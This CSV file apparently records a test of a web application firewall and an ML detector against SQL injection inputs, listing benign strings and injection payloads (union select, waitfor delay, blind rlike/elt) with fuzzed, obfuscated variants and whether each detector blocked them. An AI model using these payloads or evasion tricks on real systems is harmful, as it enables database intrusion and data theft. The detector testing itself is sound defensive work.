Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5
1,2024-12-16T20:20:49.936595,seymour@evelin.gn,200,200,200,both_correct,seymour@evelin.gn,2024-12-16T20:20:51.529948,200,200,both_correct,seymour@evelin.gn,2024-12-16T20:20:53.482027,200,200,both_correct,seymour@evelin.gn,2024-12-16T20:20:55.401406,200,200,both_correct,seymour@evelin.gn,2024-12-16T20:20:57.317511,200,200,both_correct,seymour@evelin.gn,2024-12-16T20:20:59.272256,200,200,both_correct
2,2024-12-16T20:21:01.199061,1'   )    )     )   rlike   (  select   (  case when   (  5855  =  7142  )   then 1 else 0x28 end   )    )    and    (    (     (  'fkhd'  =  'fkhd,403,403,200,waf_correct_ml_incorrect,1'   )    )     )   rlike   (  select   (  case when 	 ( /**/5855  =   OR 0  )   then '(SELECT 7)' LIKE '7' else 0x28 end   )    )    and    (    (     (  'fkhd'  =  'fkhd,2024-12-16T20:21:08.119262,403,200,waf_correct_ml_incorrect,(sEleCt 1)'   )    )   /**/ )   rlike   (  select   (  case when   ( /*:x$Bi*/'.' NOT LIKE '.2'  =   OR 0  )   then '(SeLECT 7)' LIKE ' OR 0' else 0x28 end   )    )    and    (    (     (  'fkhd'  =  'fkhd,2024-12-16T20:21:17.570721,403,200,waf_correct_ml_incorrect,(seLecT (SELECT 1))'   )    )     )   rlike   (  select   (  case when   ( /**/'.' NOT LIKE '.'U'='U''  =   OR 0  )   then '(seLEcT 7)' LIKE ' or (SELECT 1)' else 0x28 end   )    )    and    (    (    	(  'fkhd'  =  'fkhd,2024-12-16T20:21:28.321310,403,403,both_correct,"(Select (seLEct  Or 0))'   )    )  /**/  )   rlike   (  select   (  case when   ( /**/'.' NOT LIKE '.'U' like 'U''  =   OR 0  )   then '(SeleCT 4232 IN (4231,4232,4233))' LIKE ' oR (SelECT (SeLeCt 1))' else 0x28 end   )    )    and    (    (    
(  'fkhd'  =  'fkhd",2024-12-16T20:21:39.842700,403,403,both_correct,"(SeLeCt (SeLeCT  Or (SElect 1)))'   )    )  /**/  )   rlike   (  select   (  case when   ( /**/'.' NOT LIKE '.'U' LiKE 'U''  =/**/  OR 0x0  )   then '(selEcT 4232 IN (4231,')iwY' not like ')iwY<',4233))' LIKE ' oR (SeLect (SeLecT 1))' else 0x28 end   )    )    and    (    (    	(  'fkhd'  =  'fkhd",2024-12-16T20:21:53.607973,403,403,both_correct
3,2024-12-16T20:22:08.793998,"buidaoli, 49, 12-g",200,200,200,both_correct,"buidaoli,/**/ AND 1=9538,	0xc-g",2024-12-16T20:22:09.801069,200,200,both_correct,"buidaoli,  ANd	1= Or (sELEcT 602<>603),	0xc-g",2024-12-16T20:22:12.366501,200,200,both_correct,"buidaoli,  AnD	 AND/**/6282!=6283 LIKE  OR (sElecT (SeLect
602)<>603),	0xc-g",2024-12-16T20:22:15.591166,200,200,both_correct,"buidaoli,
 aNd	 aND/**/6282!= || (SELECT 0) lIke  OR (sElEct/*\vuDf*/(sELEct
')GpO' liKe ')GpO')<>603),	0xc-g",2024-12-16T20:22:20.277186,403,200,waf_incorrect_ml_correct,"buidaoli,	 and	 And/**/6282!= || (SELECT 0x0) liKE  oR (sEleCT/*\vuDf*/(seLEcT
')GpO'/*V*/liKE ')GpO') NOT LIKE 310=(SELECT 1)),	0xc-g",2024-12-16T20:22:26.485336,403,403,both_incorrect
4,2024-12-16T20:22:33.849708," select * from users where id  =  1 union select 1<@$,version  (    )   -- 1",403,403,403,both_correct," SeLEcT * from users wheRE id/**/  like   (SELECT 8491 LIKE  AND 1) union SELECT
1<@$,version  (    )   -- 1",2024-12-16T20:22:37.747918,403,403,both_correct," sEleCT * from users WHeRe id/*w*/
 lIKe   (SeLect 0x212b LiKE  and (sELECt 1)) union sElecT
1<@$,version  (    ) /**/ -- ';'!=';u'",2024-12-16T20:22:43.820088,403,403,both_correct," SeleCt * frOm users wHeRe id/**/
 LikE   (sELect 0x212b LiKe  AnD (SeLEcT (SeLEcT 1))) union/**/SELeCt
(sELect 1069 LIKe 1069)<@$,version  (    ) /*.6%/|*/
-- ';'!=';u'",2024-12-16T20:22:51.039753,403,200,waf_correct_ml_incorrect," sELEcT * FRom users wheRe id 
 like   (SElEcT 0x212b LIKE  AnD (sELECT (SEleCt 1))) union/**/SELeCt	(seleCt 'yMh' LIke 'yMh' lIKE 0x42d)<@$,version  (    ) /*.(SELECT 1)%/|*/
-- ';'!=';u'9",2024-12-16T20:23:00.088462,403,403,both_correct," SElect * FrOM users whErE id 	 lIke   (sELEcT 0x212b lIkE  anD (SELeCT (selECt 1))) union/**/SeLeCT	(SELEct 'yMh' LIKe 'yMh' LIke 0x42d)<@$,version /**/(    ) /*.(SELECT  OR 0 IN (4220,4221,(SELECT 4222)))%/|*/
-- ';'!=';u'9ku",2024-12-16T20:23:10.324360,403,403,both_correct
5,2024-12-16T20:23:21.931213,"-9392   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   2975  =  2975",403,403,200,waf_correct_ml_incorrect,"-9392   )    )/**/   or elt  (  1032
  lIkE   1032,3697=3697  )   aND    (    (   (SELECT 1)  =  (SELECT 2975)",2024-12-16T20:23:25.903866,403,403,both_correct,"-9392   )    )/*2V60]*/   oR elt  (  1032	  LiKe   1032,(SELECT 3697)=3697/**/ )   ANd    (    (   (SelECt 1)   liKe   (sElecT  aND 1 NOT LIKE 437)",2024-12-16T20:23:32.452668,403,200,waf_correct_ml_incorrect,"-9392   )    )/*Q*/   OR elt  (  9241 not like 9242
  LikE   1032,(SELEct  oR 0)=3697  )   aNd    (    (   (sElecT 0x1)   LIKE   (selECT  And 1 NOT LIKE 437)",2024-12-16T20:23:40.450213,403,200,waf_correct_ml_incorrect,"- OR 0   )    )/*Q*/   or elt  (  9241 not like 'T<'!='T<\'   liKE   1032,(SeleCt  oR 0x0)=3697  )   aND    (    (   (sELecT 0x1)   liKE   (SeLecT/*Bk*/ and 1 not like 437)",2024-12-16T20:23:49.046997,403,200,waf_correct_ml_incorrect,"- Or 0   )    )/*.$xs3*/   Or elt  (  9241 not like 'T<'<>'T<\'   lIkE    or 9855 IN (9854,9855,9856),(seLeCT  oR 0x0)=3697  ) 	 ANd    (    (   (SeLeCt 0x1)   liKE   (SElect  AnD 1 not like 0x1b5)",2024-12-16T20:23:58.411757,403,200,waf_correct_ml_incorrect
6,2024-12-16T20:24:08.713628,magrath,200,200,200,both_correct,magrath,2024-12-16T20:24:09.181484,200,200,both_correct,magrath,2024-12-16T20:24:10.617428,200,200,both_correct,magrath,2024-12-16T20:24:12.072351,200,200,both_correct,magrath,2024-12-16T20:24:13.533387,200,200,both_correct,magrath,2024-12-16T20:24:15.002881,200,200,both_correct
7,2024-12-16T20:24:16.459598,""";waitfor delay '0:0:__TIME__'--",403,403,403,both_correct,""";waitfor	delay/**/'0:(SELECT (SELECT 8854 LIKE 8854)):__TIME__'--",2024-12-16T20:24:18.091827,403,403,both_correct,""";waitfor	delay/*M.\1*/'0:(SELECT (SELECT (SELECT/**/(SELECT 1)) LIKE 8641
NOT LIKE 8642)):__TIME__'--",2024-12-16T20:24:22.260971,403,403,both_correct,""";waitfor	delay/*M.\(SELECT 1)*/'0:(SELECT (SELECT (SELECT/*~*/(SELECT
1533<>1534)) LIKE 0x21c1
NOT/**/LIKE 8642)):__TIME__'--",2024-12-16T20:24:28.396878,403,403,both_correct,""";waitfor	delay/*M.\(SELECT 1)*/'(SELECT 'B}=' LIKE 'B} LIKE/*m""['B*/'):(SELECT (SELECT (SELECT/**/(SELECT
0x5fd<>1534)) LIKE 0x21c1	NOT/**/LIKE 8642)):__TIME__'--",2024-12-16T20:24:35.538350,403,403,both_correct,""";waitfor	delay/*M.\(SELECT  OR (SELECT 0))*/'(SELECT 'B}=' LIKE 'B} LIKE/*m""['B*/'):(SelECT (SelEct (SeLecT/**/(SeleCT 0x5fd<>1534)) lIke 0x21c1	NOT like 'r' NOT LIKE 'r>')):__TIME__'--",2024-12-16T20:24:44.297212,403,403,both_correct
8,2024-12-16T20:24:54.386949,"calle vizcaya, 101 10?f",200,200,200,both_correct,"calle vizcaya,	 && 7452=7452/*H
yl*/0xa?f",2024-12-16T20:24:55.554641,200,200,both_correct,"calle/**/vizcaya,  && 0x1d1c like '&*{'!='&*{A'/**/0xa?f",2024-12-16T20:24:58.545398,200,200,both_correct,"calle vizcaya,   AND  0x1d1c
Like '&*{'!='&*{A'/**/0xa?f",2024-12-16T20:25:02.285741,200,200,both_correct,"calle vizcaya,   aND  0x1d1c
LIKe '&*{' not
like '&*{A' 0xa?f",2024-12-16T20:25:06.037309,200,200,both_correct,"calle vizcaya,   And  0x1d1c	LikE/**/'&*{' not
like '&*{A' 0xa?f",2024-12-16T20:25:10.029059,200,200,both_correct
9,2024-12-16T20:25:14.088345,"-6076""   )    )    or 8277  =  4757",403,403,200,waf_correct_ml_incorrect,"-6076""   ) 	  )    OR  AND 1 not like (SELeCT 1836)/**/ =  4757",2024-12-16T20:25:15.866451,200,403,waf_incorrect_ml_correct,"-'>	'<>'>	J'""   ) 	  )    OR  aND  and 1 not like (sELeCT	0x72c)  =  4757",2024-12-16T20:25:19.909154,403,200,waf_correct_ml_incorrect,"-'>	' NOT LIKE '>	J'""   )		  )    OR  AND  aNd 0x1 not like (SELEcT	0x72c) /**/=   OR 'dVl'='dVl'",2024-12-16T20:25:24.734857,403,403,both_correct,"-'>	' NOT LIKE '>	J'""   )		  )/*#oy
*/   or  aND  AnD 0x1	not like (seLect	0x72c) /**/=   Or 7219 IN ((seLEct 1),7219,(sELEcT 7220))",2024-12-16T20:25:30.427768,403,200,waf_correct_ml_incorrect,"-'>	' NOT LIKE '>	J'"" 	 )		  )/**/ /*VYL	*/ oR  AnD  aNd 0x1	not like (SeLeCT	0x72c) /**/ lIkE    or 7219 in ((sELecT (SELECT 1)),'~[0R'<>'~[0Rj',(sELECT  AnD 1))",2024-12-16T20:25:37.891152,403,403,both_correct
10,2024-12-16T20:25:46.565820,11901410z,200,200,200,both_correct,11901410z,2024-12-16T20:25:47.133002,200,200,both_correct,11901410z,2024-12-16T20:25:48.672755,200,200,both_correct,11901410z,2024-12-16T20:25:50.417484,200,200,both_correct,11901410z,2024-12-16T20:25:52.042616,200,200,both_correct,11901410z,2024-12-16T20:25:53.655362,200,200,both_correct
